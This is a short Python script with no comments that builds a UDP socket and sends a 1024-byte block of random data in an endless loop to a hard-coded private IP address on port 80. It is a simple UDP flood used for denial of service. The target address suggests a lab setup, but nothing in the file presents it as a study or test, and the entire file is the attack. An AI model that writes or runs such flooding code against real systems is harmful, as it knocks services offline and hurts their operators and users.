import random
import socket
sockout = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
randombytes = random._urandom(1024)
ip = "192.168.81.128"
port = 80
def go():
    while 1:
        sockout.sendto(randombytes,(ip,port))
go()
